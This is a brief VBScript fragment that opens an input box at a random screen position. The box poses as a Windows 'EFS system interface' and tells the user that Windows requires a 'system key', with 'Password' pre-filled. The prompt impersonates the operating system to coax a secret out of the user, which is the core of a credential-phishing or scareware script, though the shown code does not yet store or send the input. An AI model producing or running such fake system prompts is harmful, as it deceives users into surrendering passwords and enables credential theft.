Dim max,min
max=17000
min=0
Randomize
x = (Int((max-min+1)*Rnd+min))
Randomize
y = (Int((max-min+1)*Rnd+min))
box = InputBox("Windows is requiring a system key, please enter it in the field below.","EFS system interface","Password",x,y)
Randomize
